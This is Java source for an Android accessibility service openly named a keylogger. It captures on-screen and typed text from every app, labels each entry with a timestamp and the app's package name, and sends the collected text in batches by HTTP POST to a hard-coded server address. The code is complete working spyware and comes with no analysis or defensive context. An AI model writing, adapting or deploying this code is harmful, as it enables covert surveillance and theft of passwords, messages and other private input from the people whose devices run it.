package com.simple.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyLoggerService extends AccessibilityService {
    private static final String TAG = "KeyLogger";
    private static final String SERVER_URL = "http://192.168.1.100:8080/log";
    
    private StringBuilder logBuffer = new StringBuilder();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? 
                event.getPackageName().toString() : "unknown";
            
            String text = getEventText(event);
            
            if (text != null && !text.isEmpty()) {
                String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                    .format(new Date());
                
                String logEntry = String.format("[%s][%s] %s\n", 
                    timestamp, packageName, text);
                
                logBuffer.append(logEntry);
                Log.d(TAG, "Captured: " + logEntry);
                
                if (logBuffer.length() > 100) {
                    sendToServer(logBuffer.toString());
                    logBuffer.setLength(0);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    private String getEventText(AccessibilityEvent event) {
        try {
            if (event.getText() != null && event.getText().size() > 0) {
                return event.getText().get(0).toString();
            }
            
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence text = source.getText();
                if (text != null) {
                    return text.toString();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting text: " + e.getMessage());
        }
        return null;
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Accessibility service connected");
        sendToServer("=== KeyLogger Service Started ===");
    }

    private void sendToServer(final String data) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(5000);
                
                OutputStream os = conn.getOutputStream();
                os.write(data.getBytes());
                os.flush();
                os.close();
                
                conn.getResponseCode();
                conn.disconnect();
                
            } catch (Exception e) {
                Log.e(TAG, "Failed to send: " + e.getMessage());
            }
        }).start();
    }
}